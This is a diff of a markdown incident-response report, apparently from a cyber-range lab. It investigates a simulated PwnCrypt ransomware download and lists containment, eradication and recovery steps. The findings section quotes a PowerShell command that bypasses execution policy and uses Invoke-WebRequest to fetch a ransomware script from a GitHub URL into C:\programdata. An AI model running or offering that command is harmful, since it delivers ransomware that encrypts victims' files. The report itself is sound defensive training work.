@@ -37,36 +37,29 @@ DeviceNetworkEvents
 🔍Findings
 - Confirmed command line run by "labuser" to callout to github and save file locally. "pwncrypt.ps1 to C:\programdata "powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"
 
-## 🔬Data Analysis
+## 🔬 Data Analysis
 
-Hypothothis
+🤔 Hypothothis
 - User "labuser," with admin permissions, ran command line code that downloaded PwnCrypt ransomware to the machine. Pwncrypt encoded files and demanded a bitcoin ransom.
-Evidence
+
+🕵️ Evidence
 - Data finding of DeviceNetworkEvents and DeviceFileEvents above.
 
-Investigation
+## 🧩 Investigation
 
 - Analysis of the pwncrypt.ps1 file indicates code associated with ransom ware.
 
-Remediation
+## 🛠️ Remediation
 
-Containment
+🛑 Containment
 - Block traffic to/from assoicated URL
+- Isolate endpoints with pwncrypt.ps1 file
 
-Eradication
-- Isolate endpoints with pwncrypt.ps1 file and eradicate
+🚫 Eradication
+- Delete pwncrypt.ps1 file from C:\programdata folder via script
 - Terminate additional processes (schedule tasks, etc.)
 - Scan network for other signs of infection
 
-Recovery
+🔄 Recovery
 - Restore endpoints from last known good backup
 - Verify integridy of restored systems
-
-
-
-
-Remediate
-- Block all traffic to malicious URI
-- Remove pwncrypt.ps1 and kill related processes
-- 
-
